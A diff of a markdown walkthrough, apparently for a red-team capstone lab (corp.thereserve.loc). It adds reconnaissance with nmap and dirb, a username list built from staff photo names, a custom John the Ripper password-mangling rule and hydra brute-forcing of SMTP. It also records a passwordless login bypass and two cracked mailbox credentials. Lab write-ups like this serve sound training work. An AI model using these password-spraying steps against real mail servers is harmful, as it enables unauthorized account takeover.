@@ -69,7 +69,7 @@ Looking for php files we found the info file which can be used to find info abou
 dirb http://$WEB:80 /usr/share/wordlists/dirb/big.txt -X .php
 ```
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
 
@@ -77,27 +77,27 @@ Manually looking around there is a meet the team page, when clicking on the imag
 
 <figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
-**Output**
+**Output - users.txt**
 
 ```
-antony.ross.jpeg
-ashley.chan.jpeg
-brenda.henderson.jpeg
-charlene.thomas.jpeg
-christopher.smith.jpeg
-emily.harvey.jpeg
-keith.allen.jpeg
-laura.wood.jpeg
-leslie.morley.jpeg
-lynda.gordon.jpeg
-martin.savage.jpeg
-mohammad.ahmed.jpeg
-october.pn
-october.png
-paula.bailey.jpeg
-rhys.parsons.jpeg
-roy.sims.jpeg
-theme-preview.png
+antony.ross
+ashley.chan
+brenda.henderson
+charlene.thomas
+christopher.smith
+emily.harvey
+keith.allen
+laura.wood
+leslie.morley
+lynda.gordon
+martin.savage
+mohammad.ahmed
+october
+october
+paula.bailey
+rhys.parsons.
+roy.sims
+theme-preview
 ```
 
 
@@ -110,15 +110,19 @@ theme-preview.png
 
 <figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
 
-**STOPPED HERE**
-
-1:01:52&#x20;
-
-\[List.RulesL myrules]
-
-&#x20;^._(?=.{8,})(?=._\[0-9])(?=._\[!@#$%^&_]).\*$
 
 
+
+
+**Kali**
+
+```
+hydra -L users.txt -P mangled-passwords.txt smtp://$WebMail -V
+```
+
+
+
+##
 
 ## WebMail - Scanning&#x20;
 
@@ -137,9 +141,11 @@ nmap -A $WebMail
 <pre><code><strong>nmap -sV -sT -O -p 1-65535 $WebMail
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 ### WebMail - HTTP port 80
+
+Nothing found
 
 **Kali**
 
@@ -147,11 +153,64 @@ nmap -A $WebMail
 dirb http://$WebMail:80 /usr/share/wordlists/dirb/big.txt
 ```
 
+<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
+
+### Evolution
+
+**Kali**
+
+```
+apt install evolution -y
+evolution &
+```
+
+<figure><img src="../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
 
 
 
+### Bruteforce SMTP
 
+Add domain to end of every username
 
+**Kali**
+
+```
+sed -i 's/$/@corp.thereserve.loc/' users.txt
+```
+
+**Kali**
+
+```
+subl /opt/john/john.conf
+```
+
+Add the following to the bottom of john.conf
+
+**john.conf**
+
+```
+#Custom Rules
+[List.Rules:Capstone]
+Az"[0-9]" $[!@#%^]
+```
+
+**Kali**
+
+```
+john --wordlist=Capstone_Challenge_Resources/password_base_list.txt --rules=Capstone --stdout > mangled-passwords.txt
+```
+
+**Kali**
+
+```
+hydra -L users.txt -P mangled-passwords.txt smtp://$WebMail -V -o smtp-results.txt
+```
+
+<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -206,13 +265,13 @@ openvpn corpUsername.ovpn
 
 If I type my username and password provided I get a login error but if I try with a fake account with no password set I can bypass the login and download a ovpn file
 
-<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
-<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (42) (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
 
 It appears to work
 
@@ -242,12 +301,12 @@ nmap -sP 12.100.1.1-255
 
 12.100.1.10
 
-## WebMail - Scanning&#x20;
+## WebMail- Scanning&#x20;
 
 **Kali**
 
 ```
-nmap -A 12.100.1.10
+nmap -A $WebMail
 ```
 
 
@@ -256,8 +315,33 @@ nmap -A 12.100.1.10
 
 **Kali**
 
-<pre><code><strong>nmap -sV -sT -O -p 1-65535 12.100.1.10
+<pre><code><strong>nmap -sV -sT -O -p 1-65535 $WebMail
 </strong></code></pre>
+
+
+
+
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+
+We now have access to our mailbox
+
+<figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>
+
+The following email is in my inbox
+
+<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+
+## Creds found
+
+```
+#SMTP creds found for WebMail
+[25][smtp] host: 10.200.119.11   login: laura.wood@corp.thereserve.loc   password: Password1@
+[25][smtp] host: 10.200.119.11   login: mohammad.ahmed@corp.thereserve.loc   password: Password1!
+
+```
 
 
 
